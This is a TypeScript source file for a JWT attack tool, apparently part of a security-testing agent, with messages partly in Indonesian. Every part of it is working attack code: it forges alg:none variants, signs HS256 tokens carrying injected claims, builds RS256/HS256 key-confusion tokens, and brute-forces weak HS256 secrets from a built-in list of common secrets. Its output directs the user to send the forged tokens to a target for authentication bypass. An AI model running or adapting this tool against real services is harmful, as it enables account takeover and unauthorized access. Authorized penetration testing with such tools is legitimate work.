// JWT attack toolbar — forge (alg:none / HS256 / key-confusion), tamper claims,
// and crack weak HS256 secrets. Local crypto only (no network); use a forged
// token against an AUTHORIZED target via http_request (scope-gated).
import { createHmac, timingSafeEqual } from "node:crypto";

const COMMON_SECRETS = [
  "secret", "password", "123456", "12345678", "123456789", "qwerty", "admin", "jwt", "jwtsecret", "jwt_secret",
  "secretkey", "secret_key", "changeme", "your-256-bit-secret", "supersecret", "super_secret", "s3cr3t", "token",
  "key", "private", "test", "dev", "development", "node", "jsonwebtoken", "mysecret", "appsecret", "auth", "authsecret",
  "hs256", "jwtkey", "default", "example", "foo", "bar", "letmein", "welcome", "root", "toor", "pass", "p@ssw0rd",
];

function dec(part: string): unknown {
  try {
    return JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
  } catch {
    return null;
  }
}
function b64u(obj: unknown): string {
  return Buffer.from(typeof obj === "string" ? obj : JSON.stringify(obj)).toString("base64url");
}
function mergeClaims(payload: Record<string, unknown>, claims?: string): Record<string, unknown> {
  if (!claims) return payload;
  try {
    const c = JSON.parse(claims) as Record<string, unknown>;
    return { ...payload, ...c };
  } catch {
    return payload;
  }
}
function hmac(secret: string, data: string): string {
  return createHmac("sha256", secret).update(data).digest("base64url");
}

export type JwtAttackResult = { action: string; tokens: string[]; notes: string[] };

/** Pure JWT attack helper (exported for tests). */
export function jwtAttack(opts: { action: string; token?: string; secret?: string; publicKey?: string; claims?: string; words?: string }): string {
  const action = (opts.action || "").toLowerCase();
  const token = (opts.token || "").trim();
  const parts = token ? token.split(".") : [];
  const basePayload = (parts[1] ? dec(parts[1]) : null) as Record<string, unknown> | null;
  const payload = mergeClaims(basePayload && typeof basePayload === "object" ? basePayload : {}, opts.claims);
  if ((parts[0] && dec(parts[0]) === null) || (payload === null && parts[1])) {
    return "Error: token tidak bisa didecode (bukan JWT valid?).";
  }

  if (action === "none") {
    const variants = ["none", "None", "NONE", "nOnE"];
    const tokens = variants.flatMap((alg) => {
      const h = b64u({ alg, typ: "JWT" });
      const p = b64u(payload);
      return [`${h}.${p}.`, `${h}.${p}`];
    });
    return [
      "🎫 JWT alg:none variants (uji kirim sebagai Bearer/cookie):",
      ...tokens.map((t) => `• ${t}`),
      "",
      "Kirim via http_request: header Authorization: Bearer <token> ke endpoint ber-otorisasi target. Kalau diterima sebagai admin/user lain → auth bypass.",
    ].join("\n");
  }

  if (action === "hs256" || action === "forged" || action === "sign") {
    const secret = opts.secret || "secret";
    const h = b64u({ alg: "HS256", typ: "JWT" });
    const p = b64u(payload);
    const t = `${h}.${p}.${hmac(secret, `${h}.${p}`)}`;
    return `🎫 JWT HS256 (secret="${secret}")${opts.claims ? ` + claims ${opts.claims}` : ""}:\n• ${t}`;
  }

  if (action === "confusion" || action === "algconfusion") {
    if (!opts.publicKey) return "Error: alg-confusion butuh `publicKey` (PEM kunci publik server / cert) sebagai secret HMAC.";
    const h = b64u({ alg: "HS256", typ: "JWT" });
    const p = b64u(payload);
    const t = `${h}.${p}.${hmac(opts.publicKey, `${h}.${p}`)}`;
    return `🎫 JWT HS256 alg-confusion (HMAC dgn public key):\n• ${t}\n\nCocok kalau server pakai RS256 tapi salah verifikasi sebagai HS256.`;
  }

  if (action === "crack") {
    if (parts.length !== 3) return "Error: crack butuh token JWT 3 bagian.";
    const header = dec(parts[0]) as { alg?: string } | null;
    if ((header?.alg || "").toUpperCase() !== "HS256") return `Error: crack mendukung HS256 (token alg=${header?.alg || "?"}).`;
    const data = `${parts[0]}.${parts[1]}`;
    const sig = parts[2];
    const words = [...COMMON_SECRETS, ...((opts.words || "").split(/[\s,]+/).filter(Boolean))];
    const uniq = [...new Set(words)].slice(0, 500);
    for (const cand of uniq) {
      const want = hmac(cand, data);
      const a = Buffer.from(want);
      const b = Buffer.from(sig);
      if (a.length === b.length && timingSafeEqual(a, b)) {
        return `🎫 JWT secret KETEMU: "${cand}" — token bisa diforge sepenuhnya (auth bypass bila server pakai secret ini).`;
      }
    }
    return `🎫 JWT HS256: secret tidak ketemu di ${uniq.length} kandidat (secret kuat/non-dictionary).`;
  }

  // default: decode/summary
  const header = parts[0] ? dec(parts[0]) : null;
  return `🎫 JWT decode:\nHeader: ${JSON.stringify(header)}\nPayload: ${JSON.stringify(payload)}\n\nAksi tersedia: none | hs256 | confusion | crack.`;
}
